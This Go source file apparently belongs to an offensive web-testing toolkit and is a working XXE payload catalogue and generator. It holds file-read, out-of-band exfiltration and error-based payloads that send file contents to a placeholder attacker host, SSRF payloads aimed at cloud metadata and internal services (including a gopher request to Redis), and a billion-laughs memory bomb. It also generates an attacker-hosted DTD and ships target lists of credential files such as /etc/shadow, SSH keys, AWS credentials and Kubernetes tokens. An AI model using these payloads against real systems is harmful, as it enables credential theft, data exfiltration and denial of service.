package webgo

import (
	"fmt"
	"strings"
)

// XXE — XML External Entity injection. Payload catalogue + generator.
//
// An XXE works when a target parses attacker-supplied XML without disabling
// DTD processing. Two classes:
//
//   in-band    — the entity's expansion is reflected in the response. Local
//                file read (/etc/passwd, /proc/self/environ, ssh keys) or
//                SSRF to internal services.
//   blind      — the expansion isn't in the response, but out-of-band
//                channels (external DTD fetch, error-based, timing) still
//                leak the file contents or confirm the vulnerability.
//
// Java, PHP, .NET, Python lxml, and Ruby Nokogiri all parse XXE by default
// unless the parser is explicitly configured otherwise. OOB forms bypass
// the "no external fetch" restriction that some parsers apply only to
// file:// — the parser fetches YOUR DTD which then declares a file://
// entity, which the parser resolves on the second pass.

// XXEPayload is one XXE variant.
type XXEPayload struct {
	Label   string
	Kind    string // "in-band" | "oob" | "ssrf" | "dos"
	Payload string // may contain {FILE}, {URL}, {ATTACKER}
	Notes   string
}

// XXEPayloads is the catalogue.
var XXEPayloads = []XXEPayload{
	// in-band file read
	{
		Label: "file-read classic",
		Kind:  "in-band",
		Payload: `<?xml version="1.0"?>
<!DOCTYPE r [
  <!ELEMENT r ANY >
  <!ENTITY xxe SYSTEM "file://{FILE}">
]>
<r>&xxe;</r>`,
		Notes: "Reflected in any field that echoes back a body value. Try /etc/passwd, /proc/self/environ, C:\\Windows\\win.ini",
	},
	{
		Label: "file-read via parameter entity",
		Kind:  "in-band",
		Payload: `<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file://{FILE}">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{ATTACKER}/?d=%file;'>">
  %eval;
  %exfil;
]>
<r>anything</r>`,
		Notes: "For parsers that block direct entity expansion but allow parameter entities",
	},

	// SSRF via SYSTEM URL
	{
		Label: "ssrf-via-xxe",
		Kind:  "ssrf",
		Payload: `<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "{URL}">
]>
<r>&xxe;</r>`,
		Notes: "Replace {URL} with http://169.254.169.254/latest/meta-data/, internal admin, or gopher:// for direct protocol attack",
	},

	// OOB via external DTD
	{
		Label: "oob-external-dtd",
		Kind:  "oob",
		Payload: `<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://{ATTACKER}/evil.dtd">
<r>&exfil;</r>`,
		Notes: "evil.dtd lives on the operator's server. It declares a parameter entity that wraps the file contents into an HTTP request back to the attacker.",
	},

	// OOB error-based
	{
		Label: "oob-error-based",
		Kind:  "oob",
		Payload: `<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file://{FILE}">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %err;
]>
<r>x</r>`,
		Notes: "The parser emits an error containing the file contents. Useful when the target does not make external HTTP requests but does print parse errors.",
	},

	// DoS — billion laughs (caution: resource heavy, may be denied)
	{
		Label: "billion-laughs",
		Kind:  "dos",
		Payload: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`,
		Notes: "10^9 expansion — memory bomb. Use only against lab targets; DoS against real systems can be a separate crime class.",
	},

	// SVG / SOAP / XSLT / RSS forms of XXE
	{
		Label: "svg-xxe",
		Kind:  "in-band",
		Payload: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{FILE}">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <text>&xxe;</text>
</svg>`,
		Notes: "Useful against image-upload parsers that speak SVG",
	},

	{
		Label: "soap-xxe",
		Kind:  "in-band",
		Payload: `<?xml version="1.0"?>
<!DOCTYPE s [
  <!ENTITY xxe SYSTEM "file://{FILE}">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><data>&xxe;</data></soap:Body>
</soap:Envelope>`,
		Notes: "For SOAP endpoints — very common XXE surface in enterprise APIs",
	},

	{
		Label: "xslt-xxe",
		Kind:  "in-band",
		Payload: `<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="file://{FILE}"?>`,
		Notes: "Document-loading XSL stylesheet — reads a file into the renderer",
	},
}

// XXEOptions controls payload rendering.
type XXEOptions struct {
	File     string // local file to read
	URL      string // URL to SSRF
	Attacker string // attacker host for OOB callbacks
}

// XXEExternalDTD returns the DTD file to host on the attacker server for
// the OOB external-DTD payload.
func XXEExternalDTD(attacker string) string {
	return fmt.Sprintf(`<!ENTITY %% param1 SYSTEM "file://{FILE}">
<!ENTITY %% param2 "<!ENTITY &#x25; exfil SYSTEM 'http://%s/?%s;'>">
%%param1;
%%param2;`, attacker, "d=")
}

// RenderXXE substitutes placeholders in one payload.
func RenderXXE(p XXEPayload, opts XXEOptions) string {
	s := p.Payload
	if opts.File != "" {
		s = strings.ReplaceAll(s, "{FILE}", opts.File)
	}
	if opts.URL != "" {
		s = strings.ReplaceAll(s, "{URL}", opts.URL)
	}
	if opts.Attacker != "" {
		s = strings.ReplaceAll(s, "{ATTACKER}", opts.Attacker)
	}
	return s
}

// ListXXEForKind returns all payloads of a given kind.
func ListXXEForKind(kind string) []XXEPayload {
	var out []XXEPayload
	for _, p := range XXEPayloads {
		if p.Kind == kind {
			out = append(out, p)
		}
	}
	return out
}

// XXEDefaultFiles is the standard file list to try for a file-read XXE.
var XXEDefaultFiles = []string{
	"/etc/passwd",
	"/etc/shadow",
	"/etc/hostname",
	"/etc/hosts",
	"/proc/self/environ",
	"/proc/self/cmdline",
	"/root/.ssh/id_rsa",
	"/root/.ssh/authorized_keys",
	"/root/.aws/credentials",
	"/var/run/secrets/kubernetes.io/serviceaccount/token",
	"/var/run/docker.sock",
	"C:\\Windows\\win.ini",
	"C:\\Windows\\System32\\drivers\\etc\\hosts",
	"C:\\Windows\\Panther\\Unattend.xml",
	"C:\\Users\\Administrator\\.aws\\credentials",
}

// XXEDefaultSSRFURLs is the standard SSRF target list for an XXE.
var XXEDefaultSSRFURLs = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://127.0.0.1:8080/",
	"http://127.0.0.1:2375/version",
	"http://10.0.0.1:443/api/v1/namespaces",
	"gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A",
}
